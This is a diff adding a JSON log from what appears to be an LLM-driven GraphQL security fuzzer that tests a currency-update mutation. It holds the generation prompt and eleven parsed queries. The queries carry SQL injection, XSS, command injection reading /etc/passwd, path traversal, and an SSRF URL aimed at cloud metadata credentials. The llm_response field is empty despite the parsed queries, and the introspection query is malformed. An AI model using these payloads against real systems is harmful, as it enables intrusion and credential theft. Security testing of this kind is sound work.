@@ -1,0 +1,56 @@
+{
+  "timestamp": "20251010_055341",
+  "endpoint": "updateCurrency",
+  "prompt": "\n    You are an expert in GraphQL API security testing.\n\n    Goal: generate valid GraphQL queries for the operation shown, to get successful responses (HTTP 200) quickly while exploring robustness and testing for specific vulnerability types.\n\n    \n    CRITICAL REQUIREMENT: You MUST include at least one query for a basic call and EACH of the following vulnerability types:\n    - SQL Injection\n    - XSS Injection\n    - SSRF Injection\n    - OS Command Injection\n    - Path Injection\n    - HTML Injection\n    - Query Deny Bypass (REQUIRES TWO QUERIES: non-aliased and aliased)\n    - Introspection\n    - Field Suggestions\n\n    Strict Requirements:\n    1) Queries must be syntactically valid GraphQL.\n    2) No placeholders like <id>, \"ID!\", \"value\". Use realistic literals or known real values.\n    3) You may attempt injected strings, nulls, overlong strings, and type mismatches where appropriate.\n    4) You may output 1 query(ies) but MUST cover all vulnerability types listed above.\n    5) Do not use the words \"edges\" or \"node\".\n    6) GraphQL is case-sensitive. Match the exact operation name: updateCurrency.\n    7) If there are previous response pairs, use them to generate the query.\n    8) For each vulnerability type, craft queries that specifically test for that vulnerability pattern.\n    9) CRITICAL: Label each query with its vulnerability type using the format: ***<vulnerability_type>*** before each ```graphql block.\n    10) SPECIAL CASE: For Query Deny Bypass, you MUST generate TWO queries:\n        - First query: Non-aliased version (normal query structure)\n        - Second query: Aliased version (using query aliases like \"s: queryName\")\n        Both queries should test the same operation but with different structures to test access control bypass.\n    \n        SCHEMA (authoritative):\n        - schema types: {'Currency': {'kind': 'OBJECT', 'fields': [{'name': 'id', 'type': 'ID!'}, {'name': 'abbreviation', 'type': 'String!'}, {'name': 'symbol', 'type': 'String!'}, {'name': 'rate', 'type': 'Float!'}, {'name': 'country', 'type': 'String!'}]}}\n        - output fields (if known): Currency\n        Use only fields/args compatible with this schema.\n        \n    Context:\n    - operation: updateCurrency\n    - input (declared): updateCurrency, input: {'currencyID': 'ID!', 'abbreviation': 'String', 'symbol': 'String', 'country': 'String'}\n    - node type: mutation\n    - known real values: GraphQL source: query\nQuery: getCurrencies\nNode Type: Currency\n\nFields:\n- id: 482fb6b4-71ae-4b58-b572-835a53d230ad\n- abbreviation: HTML\nGraphQL source: query\nQuery: getCurrencies\nNode Type: Currency\n\nFields:\n- id: 80829ab2-3206-4a6b-ae71-bb2055c12e8a\n- abbreviation: USD\nGraphQL source: query\nQuery: getCurrencies\nNode Type: Currency\n\nFields:\n- id: 926398ac-415f-4804-97f3-861281b29f73\n- abbreviation: NZD\nGraphQL source: query\nQuery: getCurrencies\nNode Type: Currency\n\nFields:\n- id: 8087a65b-fd41-44b5-bbef-099bd2b334f3\n- abbreviation: USD' OR '1'='1\nGraphQL source: query\nQuery: getCurrencies\nNode Type: Currency\n\nFields:\n- id: bd159f31-b7f1-40c9-9326-3336099d98a7\n- abbreviation: HTML\n\n    Argument strategy: reuse known-good values from context and previous 200 responses.\n    Selection depth target: 1. Keep nested selections no deeper than 1 levels.\n    \n    Output format:\n    Each query must be in its own fenced block with a vulnerability type label:\n    Vulnerability Type Labels Are:\n    - SQL_Injection\n    - XSS_Injection\n    - SSRF_Injection\n    - OS_Command_Injection\n    - Path_Injection\n    - HTML_Injection\n    - Query_Deny_Bypass_Non_Aliased\n    - Query_Deny_Bypass_Aliased\n    - Introspection\n    - Field_Suggestions\n    - Basic_Call\n\n    ***<Vulnerability Type>***\n    ```graphql\n    <your query>\n    ```\n    \n    Example:\n    ***SQL_Injection***\n    ```graphql\n    query {\n      users(filter: \"1' OR '1'='1\") {\n        id\n        name\n      }\n    }\n    ```\n    \n    ***XSS_Injection***\n    ```graphql\n    query {\n      search(term: \"<script>alert('xss')</script>\") {\n        results\n      }\n    }\n    ```\n    ",
+  "llm_response": "```",
+  "parsed_queries": {
+    "query": [
+      {
+        "query": "\nmutation updateCurrency {\n  updateCurrency(input: {\n    currencyID: \"926398ac-415f-4804-97f3-861281b29f73\",\n    abbreviation: \"NZD\",\n    symbol: \"NZ$\",\n    country: \"New Zealand\"\n  }) {\n    id\n    abbreviation\n    symbol\n    country\n    rate\n  }\n}\n",
+        "vulnerability_type": "basic_call"
+      },
+      {
+        "query": "\nmutation updateCurrency {\n  updateCurrency(input: {\n    currencyID: \"80829ab2-3206-4a6b-ae71-bb2055c12e8a\",\n    abbreviation: \"USD' OR '1'='1\",\n    symbol: \"$\",\n    country: \"United States\"\n  }) {\n    id\n    abbreviation\n    country\n    rate\n  }\n}\n",
+        "vulnerability_type": "sql_injection"
+      },
+      {
+        "query": "\nmutation updateCurrency {\n  updateCurrency(input: {\n    currencyID: \"482fb6b4-71ae-4b58-b572-835a53d230ad\",\n    abbreviation: \"<script>alert('xss')</script>\",\n    symbol: \"X\",\n    country: \"Nowhere\"\n  }) {\n    id\n    abbreviation\n    symbol\n    country\n  }\n}\n",
+        "vulnerability_type": "xss_injection"
+      },
+      {
+        "query": "\nmutation updateCurrency {\n  updateCurrency(input: {\n    currencyID: \"bd159f31-b7f1-40c9-9326-3336099d98a7\",\n    abbreviation: \"SRV\",\n    symbol: \"S\",\n    country: \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"\n  }) {\n    id\n    abbreviation\n    country\n  }\n}\n",
+        "vulnerability_type": "ssrf_injection"
+      },
+      {
+        "query": "\nmutation updateCurrency {\n  updateCurrency(input: {\n    currencyID: \"8087a65b-fd41-44b5-bbef-099bd2b334f3\",\n    abbreviation: \"CMD\",\n    symbol: \"`cat /etc/passwd`\",\n    country: \"LocalHost\"\n  }) {\n    id\n    abbreviation\n    symbol\n  }\n}\n",
+        "vulnerability_type": "os_command_injection"
+      },
+      {
+        "query": "\nmutation updateCurrency {\n  updateCurrency(input: {\n    currencyID: \"926398ac-415f-4804-97f3-861281b29f73\",\n    abbreviation: \"PATHTEST\",\n    symbol: \"../../../etc/passwd\",\n    country: \"Filesystem\"\n  }) {\n    id\n    symbol\n    country\n  }\n}\n",
+        "vulnerability_type": "path_injection"
+      },
+      {
+        "query": "\nmutation updateCurrency {\n  updateCurrency(input: {\n    currencyID: \"482fb6b4-71ae-4b58-b572-835a53d230ad\",\n    abbreviation: \"<h1>Injected Heading</h1>\",\n    symbol: \"<div>SYM</div>\",\n    country: \"MarkupLand\"\n  }) {\n    id\n    abbreviation\n    country\n  }\n}\n",
+        "vulnerability_type": "html_injection"
+      },
+      {
+        "query": "\nmutation updateCurrency {\n  updateCurrency(input: {\n    currencyID: \"80829ab2-3206-4a6b-ae71-bb2055c12e8a\",\n    abbreviation: \"TRY_BYPASS\",\n    symbol: \"TB\",\n    country: \"Restricted\"\n  }) {\n    id\n    abbreviation\n    country\n  }\n}\n",
+        "vulnerability_type": "query_deny_bypass_non_aliased"
+      },
+      {
+        "query": "\nmutation updateCurrency {\n  s: updateCurrency(input: {\n    currencyID: \"80829ab2-3206-4a6b-ae71-bb2055c12e8a\",\n    abbreviation: \"TRY_BYPASS\",\n    symbol: \"TB\",\n    country: \"Restricted\"\n  }) {\n    id\n    abbreviation\n    country\n  }\n}\n",
+        "vulnerability_type": "query_deny_bypass_aliased"
+      },
+      {
+        "query": "\nquery updateCurrency {\n  updateCurrency {\n    types {\n      name\n      kind\n      fields {\n        name\n      }\n    }\n  }\n}\n",
+        "vulnerability_type": "introspection"
+      },
+      {
+        "query": "\nmutation updateCurrency {\n  updateCurrency(input: {\n    currencyID: \"926398ac-415f-4804-97f3-861281b29f73\",\n    abbreviation: \"SUGGEST\",\n    symbol: \"SG\",\n    country: \"SuggestLand\"\n  }) {\n    id\n    abbrevation\n    abbr\n    abbreviation\n  }\n}\n",
+        "vulnerability_type": "field_suggestions"
+      }
+    ]
+  },
+  "approx_tokens": 1011.5,
+  "request_time": "2025-10-10T05:53:41.088263"
+}
